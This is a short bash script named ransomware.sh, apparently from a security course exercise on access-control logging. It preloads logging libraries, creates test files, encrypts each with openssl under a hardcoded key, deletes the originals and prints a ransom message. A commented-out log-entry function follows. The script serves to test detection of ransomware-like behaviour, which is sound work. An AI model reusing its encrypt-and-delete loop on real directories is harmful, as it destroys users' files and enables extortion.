#!/bin/bash
export LD_PRELOAD="$(pwd)/logger.so"

[ -z "$1" ] && echo 'Usage, "./ransomware.sh dirname number"' && exit -1
[ -z "$2" ] && echo 'Usage, "./ransomware.sh dirname number"' && exit -1
dirName=$1
numOfFiles=$2

[ -d "$dirName" ] || mkdir $dirName


cd $dirName
.././test_aclog $numOfFiles

dirName="$(pwd)"

unset LD_PRELOAD
export LD_PRELOAD=../openSSLlogger.so
j=0
while [ $j -lt $numOfFiles ]; do
ls
    openssl enc -aes-256-ecb -in "$dirName/file_$j.txt" -out "$dirName/file_$j.txt.encrypt" -k "1234" 2> /dev/null
    rm -f "$dirName/file_$j.txt"
    j=$(( j + 1 ))
done

cd ..

echo "Give me your bitcoins!"

# Xwris logo na min mporw na to kanw etsi
# function appendToLog() {
#     [ -z $1 ] && echo "no arg" && return -1
#     mAccess=1
#     [ ! -f "$1" ] && echo "" > $1 && mAccess=0
#     [ -z $2 ] || mAccess=2 #if there is a second arg, then it's write
    
    
#     local mfilename=$(realpath "$1")
#     local muserID=$UID
#     local mDate=$(echo $(date +'%d/%m/%Y') | cat)
#     local mTime=$(echo $(date +'%T') | cat)
#     local mFingerprint=$(echo $(date '+%d%m%Y%H%M%s') | cat $mfilename - | md5sum | awk '{print $1}')
#     local mActionFlag=0

#     echo "# ---------------- Entry Start ----------------" >> $logFile
#     echo "filename -> $mfilename" >> $logFile
#     echo "userID -> $muserID" >> $logFile
#     echo "Date -> $mDate" >> $logFile
#     echo "Time -> $mTime" >> $logFile
#     echo "Access -> $mAccess" >> $logFile
#     echo "Fingerprint -> $mFingerprint" >> $logFile
#     echo "ActionFlag -> $mActionFlag" >> $logFile
#     echo "# ----------------- Entry End -----------------" >> $logFile
# }